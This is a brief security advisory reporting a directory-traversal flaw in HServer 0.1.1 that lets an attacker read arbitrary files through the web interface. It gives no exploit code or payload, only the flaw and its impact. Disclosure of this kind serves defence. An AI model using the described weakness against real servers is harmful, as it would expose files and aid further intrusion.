HServer web server is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input submitted to its web interface.

Exploiting this issue will allow an attacker to view arbitrary files within the context of the web server. Information harvested may aid in launching further attacks.

HServer 0.1.1 is vulnerable; other versions may also be affected.
